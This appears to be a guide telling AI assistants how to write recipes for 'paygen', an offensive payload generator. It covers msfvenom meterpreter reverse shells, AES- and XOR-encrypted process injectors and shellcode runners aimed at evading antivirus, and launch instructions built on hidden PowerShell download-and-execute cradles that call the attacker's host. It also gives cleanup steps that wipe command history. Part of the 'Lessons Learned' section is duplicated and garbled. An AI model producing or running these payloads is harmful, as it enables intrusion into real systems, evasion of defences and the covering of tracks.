# Paygen Recipe Creation Guide for AI Assistants

This guide provides context and examples for generating paygen recipes, preprocessors, and template files.

---

## Table of Contents

1. [Recipe Structure](#recipe-structure)
2. [Recipe Types](#recipe-types)
3. [Parameter Types](#parameter-types)
4. [Preprocessing](#preprocessing)
5. [Template Files](#template-files)
6. [Preprocessor Scripts](#preprocessor-scripts)
7. [Complete Examples](#complete-examples)
8. [Best Practices](#best-practices)

---

## Recipe Structure

All recipes are YAML files with 4 main sections:

```yaml
meta: # Metadata about the payload
parameters: # User-configurable parameters
preprocessing: # Optional data transformation steps
output: # How to generate the final payload
```

### Meta Section

```yaml
meta:
  name: "Recipe Name" # Display name in TUI
  category: "Category Name" # Groups recipes (e.g., "Process Injection", "Shellcode Generation")
  description: | # Multi-line description
    What this payload does
    How it works
    Any important notes

  effectiveness: high|medium|low # Evasion rating

  mitre: # MITRE ATT&CK mappings
    tactic: "TA0XXX - Tactic Name"
    technique: "T1XXX - Technique Name"

  artifacts: # Observable indicators
    - "Network connection to C2"
    - "File creation in temp directory"
```

### Parameters Section

```yaml
parameters:
  - name: "param_name"
    type: "ip|port|string|path|hex|integer|bool|choice"
    description: "What this parameter does"
    required: true|false
    default: "value" # Optional default
    choices: ["opt1", "opt2"] # For type: choice
    min: 1 # For type: integer
    max: 65535 # For type: integer
```

### Output Section

Two types: `template` or `command`

**Template-based:**

```yaml
output:
  type: "template"
  template: "path/to/template.cs" # Relative to templates_dir
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    # How to use the payload
```

**Command-based:**

```yaml
output:
  type: "command"
  command: "msfvenom -p windows/x64/... -f exe -o {{ output_path }}/{{ output_file }}"
  launch_instructions: |
    # How to use the payload
```

---

## Recipe Types

### 1. Template-Based Recipes

Use Jinja2 templates for source code generation. Best for:

- Custom C/C++/C# payloads
- PowerShell scripts
- Python scripts
- Any compiled language

**Template file locations:** `templates/category_name/file.ext`

### 2. Command-Based Recipes

Execute external commands (msfvenom, shellcode generators, etc.). Best for:

- Wrapper around existing tools
- Pre-compiled payloads
- Binary transformations

---

## Parameter Types

### `ip`

- Validates IPv4 addresses
- Example: `192.168.1.100`

### `port`

- Validates port numbers (1-65535)
- Example: `4444`

### `string`

- Any text value
- Example: `MyPayload`

### `path`

- File or directory path
- Can use config variables: `{config.output_dir}`
- Example: `/tmp/output`

### `hex`

- Hexadecimal values
- Example: `0xdeadbeef` or `fa12`

### `integer`

- Whole numbers
- Can specify `min` and `max`
- Example: `1024`

### `bool`

- Boolean checkbox
- Values: `true` or `false`

### `choice`

- Dropdown selection
- Requires `choices` array
- Example:
  ```yaml
  - name: "arch"
    type: "choice"
    choices: ["x86", "x64"]
    default: "x64"
  ```

---

## Preprocessing

Chain multiple preprocessing steps to transform data before final output.

### Command Preprocessing

Execute shell commands and capture output:

```yaml
preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "shellcode"
```

### Script Preprocessing

Run Python scripts with JSON I/O:

```yaml
preprocessing:
  - type: "script"
    name: "encrypt_shellcode"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
      key_size: 256
    output_var: "encrypted"
```

### Chaining Steps

Each `output_var` becomes available for subsequent steps:

```yaml
preprocessing:
  - type: "command"
    name: "step1"
    command: "generate_data"
    output_var: "raw_data"

  - type: "script"
    name: "step2"
    script: "transform.py"
    args:
      data: "{{ raw_data }}"
    output_var: "transformed_data"

  - type: "script"
    name: "step3"
    script: "format_csharp.py"
    args:
      data: "{{ transformed_data }}"
    output_var: "formatted_output"
```

---

## Template Files

Templates use Jinja2 syntax with variables from parameters and preprocessing.

### Available Variables

- **Parameters:** `{{ param_name }}`
- **Preprocessing outputs:** `{{ output_var }}`
- **Config paths:** `{{ config.output_dir }}`, `{{ config.templates_dir }}`, etc.
- **Auto-provided:** `{{ source_file }}` (in compile commands), `{{ output_path }}`, `{{ output_file }}`

### Example C# Template

**Note:** Templates should include comments to explain the code. The `remove_comments` build option will automatically strip them during compilation if enabled.

```csharp
// templates/process_injection/injector.cs
using System;
using System.Runtime.InteropServices;

class Injector {
    // AES encrypted shellcode - generated by preprocessing pipeline
    static byte[] encrypted = { {{ encrypted_shellcode }} };
    static byte[] key = { {{ aes_key }} };
    static byte[] iv = { {{ aes_iv }} };

    // Windows API imports for process injection
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    static void Main(string[] args) {
        // Decrypt shellcode using AES-256-CBC
        byte[] shellcode = AesDecrypt(encrypted, key, iv);

        // Inject into {{ target_process }}
        // Implementation uses classic DLL injection technique
        // ... injection code ...
    }

    // AES decryption routine
    // Implements standard AES-256-CBC decryption
    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv) {
        // ... decryption implementation ...
    }
}
```

### Example PowerShell Template

```powershell
# templates/powershell/runner.ps1
$ErrorActionPreference = "SilentlyContinue"

# XOR encrypted shellcode
$encrypted = @({{ encrypted_shellcode }})
$key = {{ xor_key }}

# Decrypt
$shellcode = @()
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $shellcode += $encrypted[$i] -bxor $key
}

# Allocate memory and execute
$ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length),
    [Func[IntPtr]]
)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[IntPtr]])
$delegate.Invoke()
```

---

## Preprocessor Scripts

Preprocessor scripts communicate via JSON stdin/stdout.

### Input Format

```json
{
  "arg1": "value1",
  "arg2": "value2"
}
```

### Output Format

```json
{
  "output_key": "base64_encoded_data",
  "metadata_key": "additional_info"
}
```

### Example: XOR Encryption

```python
#!/usr/bin/env python3
# preprocessors/xor_encrypt.py
import sys
import json
import base64

def main():
    # Read arguments from stdin
    args = json.load(sys.stdin)

    # Get data (base64 encoded) and key
    data = base64.b64decode(args['data'])
    key = int(args.get('key', 0xFA), 16)

    # XOR encrypt
    encrypted = bytes([b ^ key for b in data])

    # Return results
    output = {
        'encrypted': base64.b64encode(encrypted).decode(),
        'key': hex(key),
        'size': len(encrypted)
    }

    print(json.dumps(output))

if __name__ == "__main__":
    main()
```

### Example: Format for C#

```python
#!/usr/bin/env python3
# preprocessors/format_csharp.py
import sys
import json
import base64

def main():
    args = json.load(sys.stdin)
    data = base64.b64decode(args['data'])

    # Format as C# byte array
    var_name = args.get('var_name', 'payload')
    bytes_per_line = args.get('bytes_per_line', 16)

    lines = [f"byte[] {var_name} = new byte[{len(data)}] {{"]
    for i in range(0, len(data), bytes_per_line):
        chunk = data[i:i + bytes_per_line]
        hex_values = ', '.join(f'0x{b:02x}' for b in chunk)
        lines.append(f"    {hex_values},")
    lines[-1] = lines[-1].rstrip(',')  # Remove trailing comma
    lines.append("};")

    # Output formatted code directly as string
    print('\n'.join(lines))

if __name__ == "__main__":
    main()
```

**Important Notes:**

- Preprocessors receive input via JSON on stdin
- Binary data (like shellcode) is automatically base64-encoded by paygen when passed between steps
- Script preprocessors should output either:
  - Plain text/code (stored as string)
  - Valid JSON (parsed and stored as dictionary)
- Command outputs (like msfvenom) are automatically base64-encoded for safe template passing

### Built-in Preprocessors

Available in `preprocessors/`:

- `xor_encrypt.py` - XOR encryption with auto-key generation
- `aes_encrypt.py` - AES-256-CBC encryption
- `base64_encode.py` - Base64 encoding
- `compress.py` - Gzip compression
- `format_csharp.py` - Format bytes as C# arrays
- `caesar_cipher.py` - Caesar cipher

---

## Complete Examples

### Example 1: AES-Encrypted Process Injector

**Recipe:** `recipes/process_injection/remote_process_injector_aes_csharp.yaml`

```yaml
meta:
  name: "AES-Encrypted Process Injector (C#)"
  category: "Process Injection"
  description: |
    Generates encrypted shellcode and injects into a target process.
    Uses AES-256-CBC encryption to evade signature detection.
  effectiveness: high
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  artifacts:
    - "OpenProcess API calls"
    - "VirtualAllocEx memory allocation"
    - "WriteProcessMemory API calls"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444

  - name: "target_process"
    type: "string"
    description: "Target process name"
    required: true
    default: "explorer.exe"

  - name: "output_file"
    type: "string"
    default: "injector.exe"

  - name: "output_path"
    type: "path"
    default: "{config.output_dir}"

preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "shellcode"

  - type: "script"
    name: "aes_encryption"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
    output_var: "encrypted"

  - type: "script"
    name: "format_encrypted_payload"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.encrypted }}"
    output_var: "encrypted_shellcode"

  - type: "script"
    name: "format_aes_key"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.key }}"
    output_var: "aes_key"

  - type: "script"
    name: "format_aes_iv"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.iv }}"
    output_var: "aes_iv"

output:
  type: "template"
  template: "process_injection/aes_injector.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    AES-Encrypted Process Injector - Launch Instructions

    Step 1: Start Metasploit Listener

    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Step 2: Execute on Target

    In-memory execution (no disk artifacts):
    $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}')
    $assem = [System.Reflection.Assembly]::Load($data)
    [Injector.Program]::Main("{{ target_process }}".Split())

    Traditional execution:
    Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} {{ target_process }}

    Notes:

    - Uses AES-256-CBC encryption for shellcode obfuscation
    - Auto-generates encryption key and IV during build
    - Injects into {{ target_process }} process
    - VirtualAllocEx allocates RWX memory in target process
    - CreateRemoteThread executes payload
    - EXITFUNC=thread ensures clean thread termination

    Troubleshooting:

    - If injection fails: Try different target process (explorer, notepad, etc.)
    - If no connection: Check firewall rules on attacker machine
    - If AV blocks: Consider additional obfuscation or packing
    - Requires matching architecture (x64 payload for x64 process)
    - Verify target process is running before injection

    Cleanup:

    Remove payload and clear history:
    Remove-Item {{ output_file }} -Force
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

### Example 2: Simple Msfvenom Wrapper

**Recipe:** `recipes/examples/basic_msfvenom_payload.yaml`

```yaml
meta:
  name: "Basic Msfvenom Reverse Shell"
  category: "Examples"
  description: "Simple msfvenom reverse TCP payload"
  effectiveness: low
  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059 - Command and Scripting Interpreter"
  artifacts:
    - "Metasploit signatures"
    - "Outbound TCP connection"

parameters:
  - name: "lhost"
    type: "ip"
    required: true

  - name: "lport"
    type: "port"
    default: 4444

  - name: "output_file"
    type: "string"
    default: "payload.exe"

  - name: "output_path"
    type: "path"
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "command"
  command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
  launch_instructions: |
    Basic Msfvenom Payload - Launch Instructions

    Step 1: Start Metasploit Listener

    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Step 2: Execute on Target

    In-memory execution:
    $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}')
    $assem = [System.Reflection.Assembly]::Load($data)
    [Program.Main]::Main("".Split())

    Traditional execution:
    Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}

    Notes:

    - Basic msfvenom payload with no obfuscation
    - Easily detected by modern AV/EDR
    - Suitable for lab testing only
    - Staged payload requires network connectivity

    Troubleshooting:

    - If AV blocks: This is expected, payload has known signatures
    - If no connection: Check firewall on attacker machine
    - Payload size: ~200KB for staged Meterpreter

    Cleanup:

    Remove payload:
    Remove-Item {{ output_file }} -Force
```

---

## Best Practices

### Recipe Design

1. **Use descriptive names** - Make it clear what the payload does
2. **Categorize properly** - Use existing categories or create logical new ones
3. **Document artifacts** - List all observable indicators
4. **MITRE mappings** - Always include tactic and technique
5. **Effectiveness ratings**:
   - `low`: Known signatures, easily detected
   - `medium`: Some obfuscation, moderate evasion
   - `high`: Advanced techniques, strong evasion

### Naming Conventions

#### File Naming

Follow the pattern: `description_encryption_language.yaml`

Examples:

- `shellcode_injector_xor_csharp.yaml`
- `remote_process_injector_xor_csharp.yaml`
- `shellcode_runner_addtype_powershell.yaml`
- `linux_shellcode_loader_xor_c.yaml`
- `process_hollowing_xor_csharp.yaml`

**Rules:**

- Use underscores to separate words
- Put encryption type before language (if applicable)
- Always end with language identifier
- Use lowercase throughout

#### Meta Name Format

Follow the pattern: `"Description, Encryption (Language)"`

Examples:

- `"Remote Process Injector, XOR (C#)"`
- `"Shellcode Runner, Add-Type (PowerShell)"`
- `"Linux Shellcode Loader, XOR (C)"`
- `"Process Hollowing, XOR (C#)"`
- `"LSASS MiniDump Credential Dumper (PowerShell)"` (no encryption)

**Rules:**

- Use title case for description
- Add comma before encryption type (if applicable)
- Put language in parentheses at the end
- Use proper language names: C#, PowerShell, VBA, C, Python

### Parameters

1. **Use appropriate types** - Leverage built-in validation
2. **Provide defaults** - Make common use cases one-click
3. **Clear descriptions** - Users should understand without external docs
4. **Required vs optional** - Mark required parameters explicitly

### Preprocessing

1. **Chain logically** - Each step should have a clear purpose
2. **Name descriptively** - `output_var` names should indicate content
3. **Keep steps focused** - One transformation per step
4. **Test independently** - Preprocessors should work standalone

### Templates

1. **Comment generously** - Explain the code well; the build system can strip comments automatically if configured
2. **Use consistent formatting** - Makes generated code readable
3. **Escape properly** - Handle special characters in Jinja2
4. **Test compilation** - Ensure templates render valid code

### Launch Instructions

1. **Use one-liner commands** - Make commands copy-paste ready, avoid manual multi-step instructions
2. **Combine transfer and execution** - Show in-memory execution when possible
3. **Include only essential steps** - Remove verification/status check steps
4. **Keep support sections** - Always include Notes, Troubleshooting, and Cleanup
5. **Plain text only** - Do NOT use markdown formatting (no `#` headers, `**bold**`, `` `code` ``, etc.). The TUI uses Rich markup for display, and markdown syntax will be shown literally to users.

#### Metasploit Listener

Use one-liner format only:

```
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
```

Do NOT include manual step-by-step msfconsole instructions.

#### Transfer and Execution

Combine these steps and show in-memory execution patterns:

**For PowerShell Scripts (.ps1):**

```powershell
# Run from memory without touching disk
powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/script.ps1')"

# Instantly call functions
powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/PowerUp.ps1'); Invoke-AllChecks"
```

**For Compiled Binaries (.exe):**

```powershell
# Execute binary in memory
$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Program.Class]::Main("".Split())

# Execute binary in memory WITH arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Program.Class]::Main("-Ip 127.0.0.1 -Port 4444".Split())
```

**For DLLs:**

```powershell
# Interact with DLL classes in memory
$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/library.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Namespace.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

**Traditional file-based execution** (if in-memory not applicable):

```powershell
# Download and execute
Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
```

#### Required Sections

**Notes:**

- Key features and capabilities
- Encryption/obfuscation details
- Target requirements
- OPSEC considerations

**Troubleshooting:**

- Common failure scenarios and solutions
- Compatibility issues
- Detection/blocking workarounds

**Cleanup:**

- How to remove artifacts
- File deletion commands
- Log clearing (if applicable)

### Testing

Always test recipes before committing:

```bash
# Run from paygen root directory
python -m src.main

# Navigate to recipe and press Ctrl+G
# Fill in parameters
# Verify build completes
# Check output file
# Test launch instructions
```

---

## Common Patterns

### Pattern 1: Shellcode + Encryption + Injection

```
msfvenom → encrypt → format → template → compile
```

### Pattern 2: Multi-stage Loader

```
generate stager → encrypt stager →
generate stage2 → encrypt stage2 →
combine → template → compile
```

### Pattern 3: Obfuscated Script

```
generate payload → base64 → compress →
xor encrypt → format → template
```

### Pattern 4: Direct Binary Generation

```
command tool → output file
(no preprocessing or templating)
```

---

## Variable Scoping

### Global Variables (always available)

- `{{ lhost }}` (if parameter exists)
- `{{ lport }}` (if parameter exists)
- `{{ output_file }}` (always)
- `{{ output_path }}` (always)
- `{{ config.output_dir }}`
- `{{ config.templates_dir }}`
- `{{ config.recipes_dir }}`
- `{{ config.preprocessors_dir }}`

### Preprocessing Variables

Available after their step completes:

- `{{ output_var_name }}` - Full output (string or dict)
- `{{ output_var_name.key }}` - If output is JSON dict
- `{{ output_var_name.formatted }}` - Common pattern from formatters

### Compilation Variables

Only in `compile.command`:

- `{{ source_file }}` - Path to rendered template

---

## Troubleshooting

### Recipe won't load

- Check YAML syntax (use yamllint)
- Verify all required fields present
- Check parameter types are valid

### Preprocessing fails

- Test preprocessor script independently
- Check JSON input/output format
- Verify base64 encoding for binary data
- Check that previous `output_var` exists

### Template rendering fails

- Verify all variables are defined
- Check Jinja2 syntax
- Escape special characters properly
- Test with simple template first

### Compilation fails

- Check compiler is installed
- Verify command syntax
- Test command manually with rendered code
- Check file permissions

---

## File Locations

```
paygen/
├── recipes/                 # Recipe YAML files
│   ├── category1/
│   └── category2/
├── templates/              # Template source files
│   ├── process_injection/
│   ├── shellcode_injection/
│   └── powershell/
├── preprocessors/          # Python preprocessing scripts
└── output/                # Generated payloads (gitignored)
```

---

## Quick Reference

### Minimal Recipe

```yaml
meta:
  name: "Name"
  category: "Category"
  description: "Description"
  effectiveness: low|medium|high

parameters:
  - name: "param"
    type: "string"
    required: true

output:
  type: "command"
  command: "echo {{ param }}"
```

### Minimal Preprocessor

```python
#!/usr/bin/env python3
import sys, json, base64

args = json.load(sys.stdin)
data = base64.b64decode(args['data'])
# ... process data ...
print(json.dumps({'output': base64.b64encode(result).decode()}))
```

### Minimal Template

```csharp
// Minimal C# template
// Always include comments to explain the code
// The build system can strip them automatically
using System;
class Program {
    static void Main() {
        // Use template variable: {{ parameter_name }}
        // Add implementation here
    }
}
```

---

**Remember:** All payloads are for authorized security testing only. Always include proper warnings and MITRE mappings.

---

## Lessons Learned

### Working Recipe Pattern for XOR Encryption (Verified)

When creating XOR-encrypted payloads, follow this proven pattern:

**Recipe Preprocessing Steps:**

```yaml
preprocessing:
  # Step 1: Generate raw shellcode
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p ... -f raw"
    output_var: "raw_shellcode" # ← Automatically base64-encoded by paygen

  # Step 2: XOR encrypt
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}" # ← Receives base64 string, decodes internally
      key: "{{ xor_key }}" # ← Key without 0x prefix
    output_var: "xor_result" # ← Named xor_result (JSON output)

  # Step 3: Format for C#
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}" # ← Access .encrypted property from JSON
      var_name: "buf" # ← Specify variable name
      bytes_per_line: 15
    output_var: "csharp_payload" # ← Direct string output (formatted C# code)
```

**Template Pattern:**

```csharp
// XOR-encoded payload
{{ csharp_payload | indent(12) }}  // ← Use csharp_payload directly with indent filter

// Decode loop
for (int j = 0; j < buf.Length; j++)
{
    buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});  // ← Prepend 0x in template
}
```

**Parameter Definition:**

```yaml
parameters:
  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa # ← NO QUOTES - renders as plain text, template adds 0x
```

### Critical Takeaways

1. **Automatic Base64 Encoding**: Command outputs (like msfvenom raw bytes) are automatically base64-encoded by paygen when stored. This prevents binary data corruption when passing through Jinja2 templates.

2. **Variable Naming Consistency**: The `output_var` name in preprocessing MUST match the variable used in the template

   - Recipe uses `output_var: "csharp_payload"` → Template uses `{{ csharp_payload }}`
   - Mismatch = empty or incorrect output

3. **Preprocessor Output Types**:

   - **JSON output**: Parsed and stored as dictionary (e.g., `xor_result.encrypted`)
   - **Plain text output**: Stored as string (e.g., `csharp_payload`)
   - **Command output**: Automatically base64-encoded for safe template passing

4. **Hex Key Best Practice**:

   - Recipe: `default: fa` (no quotes, no 0x)
   - Template: `0x{{ xor_key }}` (add 0x prefix in template)
   - Result: Renders as `0xfa` (valid C# hex literal)

5. **format_csharp.py Behavior**:

   - Outputs complete C# declaration as plain text
   - Use `var_name` parameter to specify array variable name
   - Template uses `{{ csharp_payload | indent(N) }}` to insert with proper indentation

6. **Compiler Field**:
   - Recipe YAML uses `compile.command`, not `compile.compiler`
   - Example: `command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"`
   - TUI extracts compiler name from first word of command
     data: "{{ raw_shellcode }}" # ← Use raw_shellcode
     key: "{{ xor_key }}" # ← Key without 0x prefix
     output_var: "xor_result" # ← Named xor_result

# Step 3: Format for C#

- type: "script"
  name: "format_payload"
  script: "format_csharp.py"
  args:
  data: "{{ xor_result.encrypted }}" # ← Access .encrypted property
  var_name: "buf" # ← Specify variable name
  bytes_per_line: 15
  output_var: "csharp_payload" # ← MUST be csharp_payload for compatible templates

````

**Template Pattern:**
```csharp
// XOR-encoded shellcode (key: 0x{{ xor_key }})
{{ csharp_payload | indent(12) }}  // ← Use csharp_payload with indent filter

// Decode loop
for (int j = 0; j < buf.Length; j++)
{
    buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});  // ← Prepend 0x in template
}
````

**Parameter Definition:**

```yaml
parameters:
  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa # ← NO QUOTES - renders as plain text, template adds 0x
```

### Critical Takeaways

1. **Variable Naming Consistency**: The `output_var` name in preprocessing MUST match the variable used in the template

   - Recipe uses `output_var: "csharp_payload"` → Template uses `{{ csharp_payload }}`
   - Mismatch = empty shellcode array

2. **Preprocessor Output Access**: `xor_encrypt.py` returns JSON with multiple fields

   - Access encrypted data: `{{ xor_result.encrypted }}`
   - NOT just `{{ xor_result }}`

3. **Hex Key Best Practice**:

   - Recipe: `default: fa` (no quotes, no 0x)
   - Template: `0x{{ xor_key }}` (add 0x prefix in template)
   - Result: Renders as `0xfa` (valid C# hex literal)

4. **format_csharp.py Behavior**:

   - Outputs COMPLETE C# declaration: `byte[] varname = new byte[N] { ... };`
   - Use `var_name` parameter to specify array variable name
   - Template should use `{{ csharp_payload | indent(N) }}` to insert full declaration
   - Don't try to use `{{ shellcode_length }}` and `{{ encrypted_shellcode }}` separately

5. **Skip base64_encode.py When Not Needed**:
   - `xor_encrypt.py` handles base64 encoding internally
   - Only use `base64_encode.py` when you need the base64 string for other purposes
   - The working pattern: `raw → xor_encrypt → format_csharp` (no base64 step needed)

### Debugging Empty Shellcode Arrays

If your generated C# has `byte[] buf = new byte[] { };` (empty array):

1. Check preprocessing `output_var` names match template variables
2. Verify you're accessing the correct property (e.g., `.encrypted`)
3. Ensure the template variable exists in the preprocessing output
4. Check preprocessor script is actually being executed (look for errors in build log)
5. Remember: Command outputs are automatically base64-encoded - preprocessors handle decoding

### Launch Instructions Standards

All recipes should follow these standards for consistency:

**Code Segment Formatting**: All command examples in launch instructions should start with "$ " (dollar sign + space)

```
$ python3 -m http.server 80
$ msfconsole -x "..."
$ powershell -ep bypass -c "..."
```

**HTTP Server Port**: Always use port 80 for Python HTTP server

```
$ python3 -m http.server 80
```

**Download Commands**: Reference port 80 in all download examples

```
$ wget http://{{ lhost }}/{{ output_file }}
$ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}"
```

**One-Liner Format**: Msfconsole commands should be single-line with `-x` flag

```
$ msfconsole -x "use exploit/multi/handler; set payload ...; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
```

**In-Memory Execution**: Always provide in-memory download+execute pattern

```
$ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
$ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Class]::Main(@())"
```

**Section Order**: Launch instructions should always follow this structure:

1. Start Listener (if applicable)
2. Transfer and Execute (or In-Memory Execution)
3. Alternative methods (SMB, file-based, etc.)
4. Notes (technical details, detection info)
5. Troubleshooting (common issues and solutions)
6. Cleanup (removal commands)

### Data Flow Summary

```
msfvenom (raw bytes)
    ↓ [automatic base64 encoding]
raw_shellcode (base64 string in template)
    ↓ [passed to xor_encrypt.py]
xor_encrypt.py (decodes base64, encrypts, outputs JSON)
    ↓ [parsed as JSON dict]
xor_result.encrypted (base64 string)
    ↓ [passed to format_csharp.py]
format_csharp.py (decodes base64, formats, outputs plain text)
    ↓ [stored as string]
csharp_payload (formatted C# code string)
    ↓ [inserted into template]
Final rendered template with shellcode
```
